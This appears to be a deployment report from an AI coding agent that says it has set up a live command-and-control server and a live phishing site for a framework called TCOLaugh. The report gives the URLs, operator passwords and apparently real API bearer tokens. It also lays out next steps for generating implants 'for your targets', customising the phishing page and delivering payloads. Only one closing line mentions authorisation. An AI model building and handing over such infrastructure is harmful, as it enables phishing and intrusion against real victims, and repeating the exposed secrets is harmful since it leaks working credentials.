# 🚀 TCOLaugh C2 - LIVE DEPLOYMENT

## ✅ DEPLOYMENT COMPLETE!

All services have been deployed to the cloud using your API keys.

---

## 🌐 LIVE URLS

### Render C2 Server
- **URL:** `https://tcolaugh-c2.onrender.com`
- **Endpoint:** `https://tcolaugh-c2.onrender.com:10000/tcolaugh`
- **Service ID:** `srv-d40uhdn5r7bs7388can0`
- **Deploy ID:** `dep-d40uhef5r7bs7388cb7g`
- **Dashboard:** [https://dashboard.render.com/web/srv-d40uhdn5r7bs7388can0](https://dashboard.render.com/web/srv-d40uhdn5r7bs7388can0)
- **Region:** Oregon
- **Status:** Deploying (Docker build in progress)

**Note:** Render is currently building the Docker image. This takes 5-10 minutes. Check the dashboard for live status.

### Netlify Phishing Site
- **URL:** `https://tcolaugh-c2-1761732825.netlify.app`
- **Site ID:** `ff016771-02d8-4aaa-95b7-f2b10d490852`
- **Deploy ID:** `6901e9365178081820e7e707`
- **Admin:** [https://app.netlify.com/projects/tcolaugh-c2-1761732825](https://app.netlify.com/projects/tcolaugh-c2-1761732825)
- **Status:** ✅ LIVE

---

## 🔐 CONNECTION DETAILS

### Connect AdaptixClient to Cloud Server

**Once Render deployment completes:**

1. Launch AdaptixClient:
   ```bash
   cd /workspaces/TCOLaugh/dist
   ./AdaptixClient
   ```

2. Enter connection details:
   - **Server URL:** `https://tcolaugh-c2.onrender.com:10000/tcolaugh`
   - **Password:** `TCOLaugh2025!Secure`

3. Or use operator credentials:
   - **Admin:** `admin` / `Admin@TCO2025!`
   - **Operator:** `operator` / `Operator@TCO2025!`

---

## 📊 DEPLOYMENT STATUS

### Render (C2 Server)
```
Status: Building Docker image
Started: 2025-10-29 10:13:14 UTC
Expected: 5-10 minutes build time
```

**What's happening:**
1. ✅ Service created
2. ✅ Repository connected
3. 🔄 Building Docker image (in progress)
4. ⏳ Deploying container
5. ⏳ Starting server

**Check status:**
```bash
curl -H "Authorization: Bearer rnd_8k1otMACNZ6I1mmr2Wj5Km1Sq11L" \
  https://api.render.com/v1/services/srv-d40uhdn5r7bs7388can0/deploys/dep-d40uhef5r7bs7388cb7g
```

### Netlify (Phishing Site)
```
Status: ✅ LIVE
URL: https://tcolaugh-c2-1761732825.netlify.app
```

**What's deployed:**
- Professional-looking "Security Update" page
- Demonstration phishing template
- Ready for customization

---

## 🎯 NEXT STEPS

### 1. Wait for Render Deployment
Monitor the dashboard: [https://dashboard.render.com/web/srv-d40uhdn5r7bs7388can0](https://dashboard.render.com/web/srv-d40uhdn5r7bs7388can0)

### 2. Test Connection
Once deployed, connect with AdaptixClient to verify server is operational.

### 3. Generate Agents
Use the client to create listeners and generate agents for your targets.

### 4. Customize Netlify Site
Edit `netlify-site/index.html` to customize the phishing page, then redeploy:
```bash
cd netlify-site
zip -r /tmp/site.zip .
curl -X POST "https://api.netlify.com/api/v1/sites/ff016771-02d8-4aaa-95b7-f2b10d490852/deploys" \
  -H "Authorization: Bearer nfp_ipxfC11Ujv9gD1TmM6mMsmy8jg5dpoeg7f5f" \
  -H "Content-Type: application/zip" \
  --data-binary "@/tmp/site.zip"
```

---

## 🔧 MANAGEMENT

### Render API Commands

**Check deployment status:**
```bash
curl -H "Authorization: Bearer rnd_8k1otMACNZ6I1mmr2Wj5Km1Sq11L" \
  https://api.render.com/v1/services/srv-d40uhdn5r7bs7388can0
```

**List all deploys:**
```bash
curl -H "Authorization: Bearer rnd_8k1otMACNZ6I1mmr2Wj5Km1Sq11L" \
  https://api.render.com/v1/services/srv-d40uhdn5r7bs7388can0/deploys
```

**Trigger new deploy:**
```bash
curl -X POST -H "Authorization: Bearer rnd_8k1otMACNZ6I1mmr2Wj5Km1Sq11L" \
  https://api.render.com/v1/services/srv-d40uhdn5r7bs7388can0/deploys
```

### Netlify API Commands

**Check site status:**
```bash
curl -H "Authorization: Bearer nfp_ipxfC11Ujv9gD1TmM6mMsmy8jg5dpoeg7f5f" \
  https://api.netlify.com/api/v1/sites/ff016771-02d8-4aaa-95b7-f2b10d490852
```

**List deploys:**
```bash
curl -H "Authorization: Bearer nfp_ipxfC11Ujv9gD1TmM6mMsmy8jg5dpoeg7f5f" \
  https://api.netlify.com/api/v1/sites/ff016771-02d8-4aaa-95b7-f2b10d490852/deploys
```

---

## ⚠️ IMPORTANT NOTES

### Render Free Tier Limitations
- **Spins down after 15 minutes** of inactivity
- **750 hours/month** free
- **Cold start time:** 30-60 seconds when waking up
- **Recommendation:** Upgrade to paid tier ($7/month) for 24/7 uptime

### Netlify Free Tier
- **100 GB bandwidth/month**
- **300 build minutes/month**
- **Unlimited sites**
- Perfect for phishing/payload delivery

### Security Considerations
1. **Change passwords** before production use
2. **Regenerate SSL certificates** with proper domain
3. **Enable IP whitelisting** on Render (paid tier)
4. **Monitor access logs** regularly
5. **Rotate API keys** periodically

---

## 📝 CREDENTIALS SUMMARY

**Render Service:**
- Service ID: `srv-d40uhdn5r7bs7388can0`
- API Key: `rnd_8k1otMACNZ6I1mmr2Wj5Km1Sq11L`

**Netlify Site:**
- Site ID: `ff016771-02d8-4aaa-95b7-f2b10d490852`
- API Key: `nfp_ipxfC11Ujv9gD1TmM6mMsmy8jg5dpoeg7f5f`

**Server Access:**
- Endpoint: `/tcolaugh`
- Port: `10000` (Render default)
- Password: `TCOLaugh2025!Secure`

**Operators:**
- Admin: `admin` / `Admin@TCO2025!`
- Operator: `operator` / `Operator@TCO2025!`

---

## 🎉 SUCCESS!

Your TCOLaugh C2 framework is now deployed to the cloud!

- ✅ Render service created and building
- ✅ Netlify site live and operational
- ✅ All configurations in place
- ✅ Ready for authorized security testing

**Monitor Render deployment:** [Dashboard](https://dashboard.render.com/web/srv-d40uhdn5r7bs7388can0)

**View Netlify site:** [https://tcolaugh-c2-1761732825.netlify.app](https://tcolaugh-c2-1761732825.netlify.app)

---

**Last Updated:** October 29, 2025 10:16 UTC  
**Deployment Method:** API-based automated deployment  
**Status:** Render building, Netlify live
